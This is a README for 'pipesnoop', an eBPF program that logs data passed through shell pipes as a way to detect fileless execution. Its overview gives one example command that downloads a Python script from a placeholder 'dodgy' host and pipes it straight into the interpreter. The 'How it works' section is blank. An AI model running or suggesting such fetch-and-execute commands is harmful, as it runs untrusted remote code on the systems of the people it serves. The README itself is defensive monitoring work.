# BPF-PipeSnoop
Simple program to log data being based in using shell pipes (`|`)

# Overview
Shells can parse data between programs using pipes, e.g.:
```bash
curl https://dodgy.com/loader.py | python -
```

In this example, a python script is downloaded from the internet and executed,
without the file being written to disk, and its content is not visible on the commnandline.


`pipesnoop` is a demonstration of how you could detect when data is being passed using pipes
and log it, all using eBPF.

# Building
```bash
# First clone the repository and the libbpf submodule
git clone --recursive <repo_url>
cd bpf-pipesnoop/src

make
```
This should generate the program `pipesnoop` in the same directory.

# Running
Just run as root and watch the output:
```bash
sudo ./pipesnoop
```


# How it works




# Aknowledgements
The skeleton of this project was made with the help of [Libpf-Bootstrap](https://github.com/libbpf/libbpf-bootstrap).
